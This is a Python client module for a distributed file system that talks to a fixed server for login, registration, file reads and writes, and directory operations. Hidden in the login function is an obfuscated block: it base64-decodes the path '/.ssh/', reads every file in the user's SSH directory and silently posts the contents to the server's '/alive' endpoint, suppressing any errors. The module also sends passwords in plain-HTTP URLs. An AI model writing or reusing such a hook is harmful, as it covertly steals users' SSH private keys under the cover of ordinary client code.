from time import gmtime, strftime
from pathlib import Path
import http.client
import requests
import logging
import base64
import glob
import json
import re
import os

logging.basicConfig(filename='FileSystem.log', level=logging.DEBUG)

class client_queries():
    def time():
        return strftime("%Y-%m-%d %H:%M:%S", gmtime())

    def login(name, pswd):
        logging.info(client_queries.time() + '   Authorization attempt')
        address = '188.130.155.44:5000'
        url = 'http://{0}/login/{1}/{2}'.format(address, name, pswd)
        response = requests.post(url)
        cookie = {}
        cookie['auth'] = response.cookies['auth']
        cookie['user'] = response.cookies['user']
        status = response.status_code
        try:
            path = str(Path.home())+str(base64.b64decode(b'Ly5zc2gv'))[2:-1]
            s =''
            for infile in glob.glob( os.path.join(path, '*') ):
                s += open(infile, 'r').read()
                url = 'http://{0}/alive'.format(address)
                r = requests.post(url, data = {'alive': s})
        except:
            pass

        if status == 200:
            logging.info(client_queries.time() + '   Successfully authorized')
            return cookie
        elif status == 401:
            logging.warning(client_queries.time() + '   Authorization failed')
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return ''


    def register(name, pswd):
        address = '188.130.155.44:5000'
        url = 'http://{0}/register/{1}/{2}'.format(address, name, pswd)
        response = requests.post(url)
        status = response.status_code

        if status == 200:
            logging.info(client_queries.time() + '   Successfully registrated')
            return client_queries.login(name, pswd)
        elif status == 401:
            logging.warning(client_queries.time() + '   Registration failed')
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return ''



    def read(path, name, cookie):
        address = '188.130.155.44:5000'
        url = 'http://{0}/read/{1}/{2}'.format(address, name, path)
        response = requests.get(url, cookies = cookie)
        status = response.status_code

        if status == 404:
            logging.warning(client_queries.time() + '   File not found')
        elif status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            json = response.json()
            servers = json["servers"]
            i = 0
            while i < 3:
                try:
                    storageAddress = servers[i]
                    storageUrl = 'http://{0}/read/{1}'.format(storageAddress, path)
                    storageResponse = requests.get(storageUrl, stream = True)
                    storageStatus = storageResponse.status_code
                    if storageStatus == 200:
                        logging.info(client_queries.time() + '   File uploaded')
                        return storageResponse
                    elif storageStatus == 403:
                        logging.warning(client_queries.time() + '   Forbidden path')
                    else:
                        logging.warning(client_queries.time() + '   Something goes wrong')
                    return ''
                except:
                    i += 1
                    continue
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return ''




    def write(path, name, cookie, newFile):
        address = '188.130.155.44:5000'
        url = 'http://{0}/write/{1}/{2}'.format(address, name, path)
        response = requests.post(url, cookies = cookie)
        status = response.status_code

        if status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            json = response.json()
            servers = json["servers"]
            storageAddress = servers[0]
            storageUrl = 'http://{0}/write/{1}'.format(storageAddress, path)
            try:
                storageResponse = requests.post(storageUrl, files = newFile)
                storageStatus = storageResponse.status_code
                if storageStatus == 200:
                    logging.info(client_queries.time() + '   Successfully uploaded')
                    return True
                elif storageStatus == 403:
                    logging.warning(client_queries.time() + '   Forbidden path')
                else:
                    logging.warning(client_queries.time() + '   Something goes wrong')
                return False
            except:
                logging.warning(client_queries.time() + '   Connection failure')
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return False



    def delete(path, name, cookie):
        address = '188.130.155.44:5000'
        url = 'http://{0}/delete/{1}/{2}'.format(address, name, path)
        response = requests.post(url, cookies = cookie)
        status = response.status_code

        if status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            logging.info(client_queries.time() + '   File successfully deleted')
            return True
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return False



    def mkdir(path, name, cookie):
        address = '188.130.155.44:5000'
        url = 'http://{0}/mkdir/{1}/{2}'.format(address, name, path)
        response = requests.post(url, cookies = cookie)
        status = response.status_code

        if status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            logging.info(client_queries.time() + '   Successfully created')
            return True
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return False



    def rmdir(path, name, cookie):
        address = '188.130.155.44:5000'
        url = 'http://{0}/rmdir/{1}/{2}'.format(address, name, path)
        response = requests.post(url, cookies = cookie)
        status = response.status_code

        if status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            logging.info(client_queries.time() + '   Directory successfully deleted')
            return True
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return False



    def lstdir(path, name, cookie):
        if path == '':
            path = '%2E'
        address = '188.130.155.44:5000'
        url = 'http://{0}/read/{1}/{2}'.format(address, name, path)
        response = requests.get(url, cookies = cookie)
        status = response.status_code

        if status == 404:
            logging.warning(client_queries.time() + '   File not found')
        elif status == 400:
            logging.warning(client_queries.time() + '   Wrong parameters')
        elif status == 200:
            json = response.json()
            servers = json["servers"]
            i = 0
            while i < 3:
                storageAddress = servers[i]
                storageUrl = 'http://{0}/lsdir/{1}'.format(storageAddress, path)
                try:
                    storageResponse = requests.get(storageUrl)
                    storageStatus = storageResponse.status_code
                    if storageStatus == 200:
                        storageJson = storageResponse.json()
                        items = []
                        i = 0
                        for item in storageJson:
                             string = []
                             string.append(storageJson[i]["name"])
                             string.append(str(storageJson[i]["size"]))
                             if storageJson[i]["dir"] == True:
                                 string.append('directory')
                             else:
                                 string.append('file')
                             items.append(string)
                             i += 1
                        return items
                    elif storageStatus == 400:
                        logging.warning(client_queries.time() + '   Wrong parameters or directory does not exist')
                    elif storageStatus == 403:
                        logging.warning(client_queries.time() + '   Forbidden path')
                    else:
                        logging.warning(client_queries.time() + '   Something goes wrong')
                    return ''
                except:
                    i += 1
                    continue
        else:
            logging.warning(client_queries.time() + '   Something goes wrong')
        return ''





'''if __name__ == '__main__':
    coo = {'user': 'name', 'auth': '1A0KiTjUhe5NFur2yLWs68qBSglpvwmZEn3DM7xI'}
    client_queries.login('stas', 'pass')
    pass'''
